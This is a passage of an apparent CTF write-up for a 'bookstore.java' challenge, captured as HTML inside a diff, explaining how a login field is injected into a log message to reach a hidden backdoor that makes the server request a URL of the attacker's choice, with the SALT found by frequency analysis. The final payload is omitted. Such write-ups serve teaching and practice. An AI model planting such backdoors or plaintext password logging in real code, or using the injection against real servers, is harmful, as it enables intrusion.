+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Error: &#34;</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>This function will just write the <strong>logMessage</strong> parameter to the logs and also call <strong>analyzeMessage()</strong> with this parameter.</p>
+<p>Again, we need to be able to reach this function, it is called in several places, including the following function :</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="c1">// Logger.java line 132
+</span><span class="c1"></span>  
+<span class="kd">public</span> <span class="kt">void</span> <span class="nf">info</span><span class="o">(</span><span class="n">String</span> <span class="n">info_mssg</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
+    <span class="n">String</span> <span class="n">curr_time</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">returnCurrentTime</span><span class="o">();</span>
+    <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;INFO &#34;</span><span class="o">);</span>
+    <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;[&#34;</span><span class="o">);</span>
+    <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">curr_time</span><span class="o">);</span>
+    <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;] --&gt; &#34;</span><span class="o">);</span>
+    <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">info_mssg</span><span class="o">);</span>
+    <span class="k">this</span><span class="o">.</span><span class="na">writeToLogfile</span><span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+    <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+<span class="o">}</span>
+</code></pre></div><p>And finally this function is called here <em>(which is the function called at each login attempt)</em> :</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="c1">// ServerSide.java line 110
+</span><span class="c1"></span>
+  <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">parseRequest</span><span class="o">(</span><span class="n">String</span> <span class="n">requestUri</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">UnsupportedEncodingException</span> <span class="o">{</span>
+    <span class="n">HashMap</span> <span class="o">&lt;</span> <span class="n">String</span><span class="o">,</span> <span class="n">String</span> <span class="o">&gt;</span> <span class="n">query_params</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">splitQuery</span><span class="o">(</span><span class="n">requestUri</span><span class="o">);</span>
+    <span class="n">String</span> <span class="n">username</span> <span class="o">=</span> <span class="n">query_params</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;username&#34;</span><span class="o">);</span>
+    <span class="n">String</span> <span class="n">password</span> <span class="o">=</span> <span class="n">query_params</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;password&#34;</span><span class="o">);</span>
+    <span class="n">String</span> <span class="n">hashed_username</span> <span class="o">=</span> <span class="n">ServerSide</span><span class="o">.</span><span class="na">getMd5</span><span class="o">(</span><span class="n">username</span><span class="o">);</span>
+    <span class="n">String</span> <span class="n">hashed_password</span> <span class="o">=</span> <span class="n">ServerSide</span><span class="o">.</span><span class="na">getMd5</span><span class="o">(</span><span class="n">password</span><span class="o">);</span>
+    <span class="n">String</span> <span class="n">mssg</span> <span class="o">=</span> <span class="s">&#34;username: &#34;</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s">&#34;, password: &#34;</span> <span class="o">+</span> <span class="n">password</span><span class="o">;</span>
+    <span class="k">this</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="n">mssg</span><span class="o">);</span>
+    <span class="k">return</span> <span class="n">hashed_username</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="s">&#34;21232f297a57a5a743894a0e4a801fc3&#34;</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">hashed_password</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="s">&#34;21232f297a57a5a743894a0e4a801fc3&#34;</span><span class="o">);</span>
+<span class="o">}</span>
+</code></pre></div><p>Note that it is possible to control what is passed to the <strong>info()</strong> function because the user entries <strong>username</strong> and <strong>password</strong> are concatenated directly into the parameter.</p>
+<p>So to summarise this reverse part, we have a way to make the server execute an HTTP request with the following sequence :</p>
+<ul>
+<li>Type a malicious username (<strong>maliciousUsername</strong>)</li>
+<li>It will be concatenated into the message for the logs (<strong>maliciousInput</strong>)</li>
+<li>And so the execution chain will be as follows:</li>
+</ul>
+<p>this.logger.info(<strong>maliciousInput</strong>) =&gt; this.writeToLogfile(<strong>maliciousInput</strong>) =&gt; this.analyzeMessage(<strong>maliciousInput</strong>) =&gt; this.downloadFile(<strong>maliciousInput</strong>)</p>
+<p>However, the hardest part remains: finding the SALT in order to match the following pattern and reach the backdoor</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="s">&#34;get\\{.*\\}salt=&#34;</span> <span class="o">+</span> <span class="n">System</span><span class="o">.</span><span class="na">getenv</span><span class="o">(</span><span class="s">&#34;SALT&#34;</span><span class="o">)</span>
+</code></pre></div><h1 id="find-salt">Find SALT</h1>
+<p>This is the longest part and where you had to guess how the <strong>SALT</strong> was generated. After long hours of research and reading each line of code, two lines of code caught my attention because they were outside the logic of variable naming encountered so far :</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="c1">// Art.java line 17
+</span><span class="c1"></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">printTextArt</span><span class="o">(</span><span class="n">String</span> <span class="n">artText</span><span class="o">,</span> <span class="kt">int</span> <span class="n">textHeight</span><span class="o">,</span> <span class="n">ASCIIArtFont</span> <span class="n">fontType</span><span class="o">,</span> <span class="n">String</span> <span class="n">artSymbol</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">frequency</span> <span class="o">=</span> <span class="n">fontType</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
+        <span class="kt">int</span> <span class="n">analysis_should_be_fun</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">findImageWidth</span><span class="o">(</span><span class="n">textHeight</span><span class="o">,</span> <span class="n">artText</span><span class="o">,</span> <span class="n">frequency</span><span class="o">);</span>
+        
+        <span class="o">[...]</span>
+</code></pre></div><p>&ldquo;frequency analysis_should_be_fun&rdquo;.</p>
+<p>Despairing, I say to myself that it would not be impossible for the <strong>SALT</strong> to be for each letter, the one that appears the most respectively in the 8 paragraphs <em>(because the challenge index indicated that there were 8 letters in the SALT)</em></p>
+<p>So after calculating the frequency of appearance (respecting the case) of the letters in each paragraph, the following <strong>SALT</strong> is obtained:</p>
+<!-- raw HTML omitted -->
+<p>We now have everything we need to run the backdoor</p>
+<h1 id="use-backdoor-inside-source-code">Use backdoor inside source code</h1>
+<p>For this step we just have to login with the following payload for the <strong>username</strong> or <strong>password</strong></p>
+<!-- raw HTML omitted -->
+<p>When authenticating, this is what will happen:</p>
+<ul>
+<li>Our username will be concatenated with text for the log files</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>The execution chain will be as follows:</li>
+</ul>
+<p>this.logger.info(<strong>maliciousInput</strong>) =&gt; this.writeToLogfile(<strong>maliciousInput</strong>) =&gt; this.analyzeMessage(<strong>maliciousInput</strong>)</p>
+<ul>
+<li>analyzeMessage(<strong>maliciousInput</strong>) will match the following pattern and extract what is between { and } and send it as a parameter to the downloadFile() function :</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="s">&#34;get\\{.*\\}salt=&#34;</span> <span class="o">+</span> <span class="n">System</span><span class="o">.</span><span class="na">getenv</span><span class="o">(</span><span class="s">&#34;SALT&#34;</span><span class="o">)</span>
+</code></pre></div><p>• this.downloadFile(<strong>maliciousInput</strong>) sends a request to <!-- raw HTML omitted --><a href="https://XXXXXXXXX.x.pipedream.net">https://XXXXXXXXX.x.pipedream.net</a><!-- raw HTML omitted --></p>
+<p><img src="/p/dctf-2022-bookstore.java/flag.PNG"
+	width="1203"
+	height="166"
+	srcset="/p/dctf-2022-bookstore.java/flag_hu8a2ac0f7dab66218ebd4a851faae2416_13751_480x0_resize_box_2.PNG 480w, /p/dctf-2022-bookstore.java/flag_hu8a2ac0f7dab66218ebd4a851faae2416_13751_1024x0_resize_box_2.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="724"
+		data-flex-basis="1739px"
+	
+></p>
+<p><strong>FLAG : dctf{L0g_4_hid3n_d@7@_n0t_s0_h@rd_righ7}</strong></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Contenus liés</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/vsctf-2022-vscaptcha/">
+        
+        
+            <div class="article-image">
+                <img src="/p/vsctf-2022-vscaptcha/cover.8f57b2fb40f3dec4271312c0e2ad871d_hu38fe278006cf35f230a31e53c5b70eba_203359_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post vsCTF 2022 - vsCAPTCHA"
+                        
+                        data-hash="md5-j1ey&#43;0Dz3sQnExLA4q2HHQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">vsCTF 2022 - vsCAPTCHA</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/inter-iut-hr-panel-1-2-3/">
+        
+        
+            <div class="article-image">
+                <img src="/p/inter-iut-hr-panel-1-2-3/cover.707c5de47c776550253b9b4720aaa3e2_huc265a5118e6b97a0e7d177e19ea0a1cf_549279_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Inter IUT - HR Panel (1, 2 &amp; 3)"
+                        
+                        data-hash="md5-cHxd5Hx3ZVAlO5tHIKqj4g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Inter IUT - HR Panel (1, 2 &amp; 3)</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/heroctf-v3-winventory/">
+        
+        
+            <div class="article-image">
+                <img src="/p/heroctf-v3-winventory/cover.a0029d17eed506c12795acb1c584a7b2_hu0767c118ba10ca67569e79c8dd3099ad_612104_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HeroCTF V3 - Winventory"
+                        
+                        data-hash="md5-oAKdF&#43;7VBsEnlayxxYSnsg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HeroCTF V3 - Winventory</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/catf-2022-my-secret-vault/">
+        
+        
+            <div class="article-image">
+                <img src="/p/catf-2022-my-secret-vault/cover.4164a5e9604d1143e691e16200dac3e6_hu2e840c0771da91caf4371bc6f144fc70_180002_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post CATF 2022 - My Secret Vault"
+                        
+                        data-hash="md5-QWSl6WBNEUPmkeFiANrD5g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CATF 2022 - My Secret Vault</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/heroctf-v4-deadalus/">
+        
+        
+            <div class="article-image">
+                <img src="/p/heroctf-v4-deadalus/cover.f82aa23a9ce3d56902419b54a6794f43_hu47698ab55ffe6c3832e7d8a5f4b18af2_764019_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HeroCTF V4 - Deadalus"
+                        
+                        data-hash="md5-&#43;CqiOpzj1WkCQZtUpnlPQw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HeroCTF V4 - Deadalus</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2021 - 
+        
+        2022 Endeavxor
+    </section>
+    
+    <section class="powerby">
+        
+            Jamais trop tard pour ouvrir un livre. <br/>
+        Généré avec <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Thème <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> conçu par <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
